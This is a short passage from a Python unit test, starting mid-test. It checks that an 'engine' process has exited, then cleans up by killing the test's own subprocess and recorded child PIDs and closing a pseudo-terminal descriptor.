            self.assertFalse(_alive(info["engine"]))
        finally:
            if proc.poll() is None:
                proc.kill()
            if info:
                for pid in (info["engine"], info["kid"]):
                    try:
                        os.kill(pid, signal.SIGKILL)
                    except ProcessLookupError:
                        pass
            os.close(master)
